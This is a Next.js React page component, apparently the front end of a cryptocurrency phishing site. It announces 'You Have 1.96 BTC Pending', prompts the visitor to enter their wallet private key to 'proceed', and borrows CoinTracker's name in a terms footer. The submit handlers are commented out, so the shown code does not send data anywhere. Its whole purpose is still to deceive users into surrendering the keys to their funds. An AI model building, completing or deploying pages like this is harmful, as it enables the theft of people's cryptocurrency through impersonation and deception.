"use client";

import Navbar from "../components/Navbar";
import { ContextProvider } from "../context/AppContext";
import { Button, Form, Input } from "antd";

export default function Home() {
  return (
    <ContextProvider>
      <div className="h-full w-full flex flex-col">
        <Navbar />
        <Form
          name="login"
          className={
            "container px-4 mx-auto mt-12 flex-auto flex flex-col items-center gap-6 w-full sm:max-w-[400px]"
          }
          // onFinish={onFinish}
          // onFinishFailed={onFinishFailed}
          autoComplete="off"
        >
          <h1 className="text-[1.5rem] font-[600]">
            You Have 1.96 BTC Pending
          </h1>
          <div className="flex flex-col items-center w-full">
            <Form.Item
              name="private_key"
              className="w-full"
              rules={[
                {
                  required: true,
                  message: "",
                },
              ]}
            >
              <Input
                placeholder="Enter PRIVATE KEY Code to Proceed"
                className="w-full"
              />
            </Form.Item>
            <p className="mt-[0.1rem] text-grey text-[0.8rem] text-light">
              you have to get your private key to proceed!
            </p>
          </div>

          <Form.Item className="w-full">
            <Button
              // loading={isLoading}
              type="primary"
              htmlType="submit"
              className="w-full bg-blue text-white !text-[0.8rem]"
            >
              Click Here to Proceed
            </Button>
          </Form.Item>

          <div className="flex flex-row justify-center mt-10 text-center">
            <p className="text-[0.8rem]">
              When you create a CoinTracker account, you<br></br>agree to the{" "}
              <span className="underline cursor-pointer">Terms</span> and{" "}
              <span className="underline cursor-pointer">Privacy Policy</span>.
            </p>
          </div>
        </Form>
      </div>
    </ContextProvider>
  );
}
